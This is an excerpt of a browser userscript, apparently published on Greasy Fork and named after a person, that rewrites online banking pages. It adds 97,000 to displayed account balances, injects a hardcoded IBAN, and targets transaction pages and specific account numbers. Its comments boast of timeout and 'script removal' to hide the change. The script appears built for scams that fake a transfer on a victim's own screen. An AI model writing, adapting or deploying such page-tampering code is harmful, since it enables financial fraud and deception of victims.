// ==UserScript==
// @name         Ed Combined Comm PETER REISCHL
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/484444/Ed%20Combined%20Comm%20PETER%20REISCHL.user.js
// @updateURL https://update.greasyfork.org/scripts/484444/Ed%20Combined%20Comm%20PETER%20REISCHL.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
 ...
 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +97000 },
        { index: 1, adjustmentAmount: +97000  },
        { index: 2, adjustmentAmount: +97000  },
...
balanceModificationAmount = balanceChange = 97000.20 ;
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE77 2904 0090 0153 3512 00"
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10841439452") > 0 || window.location.href.indexOf("10726842017") > 0 ) {
...
///////////////////////////////////////////////////////////////////////////////
  ...
  if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10753426948") > 0 || window.location.href.indexOf("10726842017") > 0 ) {
